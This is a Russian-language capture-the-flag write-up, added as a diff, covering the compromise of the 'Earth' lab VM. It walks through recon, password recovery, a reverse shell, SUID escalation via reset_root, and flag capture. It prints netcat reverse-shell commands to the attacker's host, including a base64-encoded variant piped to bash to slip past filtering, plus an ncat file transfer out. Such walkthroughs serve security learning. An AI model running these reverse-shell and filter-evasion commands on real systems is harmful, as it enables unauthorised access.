@@ -1,0 +1,92 @@
+РАЗВЕДКА:
+	Я знаю, что уязвимая машина находится в моей сети. Моя кали линукс имеет ip адрес: 10.0.2.6. Используя команду "sudo netdiscover -r 10.0.2.6", я ищу все устройства, находящиеся в моей сети (ScreenShots/ipaddress.png). Мое внимание привлекли два последних ip адреса.Проанализировав свою сеть, я понял, что ip адрес моей цели: 10.0.2.13.
+
+СКАНИРОВАНИЕ:
+	Сканирование я начал со сканирования с помощью nmap. Я использовал команду "sudo nmap -sV -vvv -p- -O -oA FirstNmapScan 10.0.2.13" и получил следующие результаты (ScreenShots/nmap.png):
+		1. Mac адрес: 08:00:27:23:63:BC (Oracle VirtualBox virtual NIC) ;
+		2. ОС цели: Linux 4.15 - 5.8, Fedora, но результат неточный так как присутствует предупреждение: "Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port";
+		3. Открытые порты и их службы:
+			1) 22/tcp ssh OpenSSH 8.6 (protocol 2.0) ;                                                                                                                                                                      
+			2) 80/tcp http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) ; 
+	            3) 443/tcp ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9) .
+		4. Работающие приложения: 
+			1) Python 3.9;
+			2) Apache httpd 2.4.51;
+			3) Ssh.
+
+	Порт 80 выдал мне веб-сайт с ошибкой (ScreenShots/port80.png).
+	Порт 443 выдал тестовую страницу сервера (ScreenShots/port443.png). 
+	Файл "robots.txt" отстутствует у обоих портов.
+	Исходный код не дал полезных данных.
+
+	Перехожу к перечислению. Такие инструменты, как gobuster, ffuf ничего полезного не дали. Я решил запустить дополнительное сканирование nmap в надежде найти хоть какую-то полезную информацию. Я использовал команду 
+	"nmap -p 80, 443 --script=http* -sV -vvv 10.0.2.13". Пока ждал, взглянул на сертификаты на странице https://10.0.2.13:443/ и кое-что нашел (screenShots/address.png, ScreenShots/subdomain.png).Это, возможно, адреса
+	страниц  сайта. Добавлю их в файл /etc/hosts
+	(ScreenShots/hosts.png). В результате у меня есть веб-страницы (ScreenShots/earth_local.png и ScreenShots/terratest_earth_local.png).
+
+	http://earth.local/ (Scans/FirstFfufScanDir.html):
+		1) robots.txt отсутствует;
+		2) исходный код подсказок не дал;
+
+	Перехожу к перечислению директорий и поддоменов earth.local.
+
+		3) найдена директория "admin" (ScreenShots/admin_page.png).
+
+	https://terratest.earth.local (Scans/FirstFfufScanSubdomainDir.html):
+		1) robots.txt -- ScreenShots/terratest_robots.png;
+		2) исходный код подсказок не дал;
+
+	Перехожу к перечислению директорий и поддоменов terratest.earth.local.
+	В файле robots.txt был скрытый файл testingnotes.txt . Из этого файла я получил много полезной информации (robots.png): имя админа, дополнительный файл, способ шифрования.
+	Файл testdata.txt используется как ключ, согласно файлу.
+
+	Все это время я хотел посмотреть на эти символы внизу формы ввода (ScreenShots/symbols.png).У меня есть предполагаемый ключ.Захожу в CyberChef (ScreenShots/password.png). Комбинация повторяется. Возможно, комбинация 
+	"earthclimatechangebad4humans" является паролем.
+
+	Пробую войти в административную панель под данными: terra -- earthclimatechangebad4humans. Я получил доступ к административной панели и терминалу. Я зашел под пользователем "apache" (ScreenShots/user.png). Я могу читать файл 
+"/etc/passwd" и смог выделить несколько пользователей. Возможно, я должен переключиться на одного из них. Команды 
+"history" и "cd /home" результата не дают. Попробую сделать реверс шелл. Я использовал команду 
+"nc 10.0.2.6 1234 -e /bin/bash". Сервер не пропускает удаленные соедиенения (ScreenShots/reverse_shell.png). 
+Попробую закодировать сообщение. Я закодировал команду и получил: nc 10.0.2.6 1234 -e /bin/bash -- 'echo "bmMgMTAuMC4yLjYgMTIzNCAtZSAvYmluL2Jhc2g=" | base64 -d | bash'. Далее с помощью python я получил оболочку bash 
+(ScreenShots/decode_shell.png). На машине существует пользователь earth, но я не имею к его данным прав доступа 
+(ScreenShots/earth1.png). Приступаю к повышению привелегий.
+
+РАЗВЕДКА:
+	Команда "history" -- пустая (ScreenShots/history.png).
+	Команда "find / -perm -u=s -user root 2>/dev/null" (поиск SUID битов) имеет следующие результаты 
+(ScreenShots/suid.png):
+		/usr/bin/chage
+		/usr/bin/gpasswd
+		/usr/bin/newgrp
+		/usr/bin/su
+		/usr/bin/mount
+		/usr/bin/umount
+		/usr/bin/pkexec
+		/usr/bin/passwd
+		/usr/bin/chfn
+		/usr/bin/chsh
+		/usr/bin/at
+		/usr/bin/sudo
+		/usr/bin/reset_root
+		/usr/sbin/grub2-set-bootflag
+		/usr/sbin/pam_timestamp_check
+		/usr/sbin/unix_chkpwd
+		/usr/sbin/mount.nfs
+		/usr/lib/polkit-1/polkit-agent-helper-1
+Мое внимание привлек "/usr/bin/reset_root": я раньше с этим не сталкивался, да и название "говорящее". В базе 
+gtfobins.github.io этого бита нет. Перехожу к исследованию этого бита. Результаты исследования 
+(ScreenShots/reset_root_results.png). Я хочу поэксперементировать с этим файлом на своей машине, поэтому перебрасываю 
+его, используя команду "ncat 10.0.2.6 < /usr/bin/reset_root". На своей машине я анализирую файл с помощью библиотеки 
+ltrace (ScreenShots/ltrace_analis.png). На целевой машине нет нужных триггеров (ScreenShots/triggers.png). Я добавлю их вручную. После добавления триггеров я получаю пароль от root (ScreenShots/root.png). Воспользовавшись утилитой 
+find я нашел флаги (ScreenShots/flags.png).
+Пользовательский флаг -- [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
+Флаг root -- [root_flag_b0da9554d29db2117b02aa8b66ec492e]
+
+С помощью ncat я скачал флаги на собственную машину (Results/root_flag.txt и Results/user_flag.txt).
+Теперь данные у злоумышленника.
+
+ОЧИСТКА СЛЕДОВ:
+	Удалил все созданные мной триггеры. Более я ничего не вносил.
+
+НАПИСАНИЕ ОТЧЕТА: 
+	Отчет будет на сайте во вкладке "Earth".
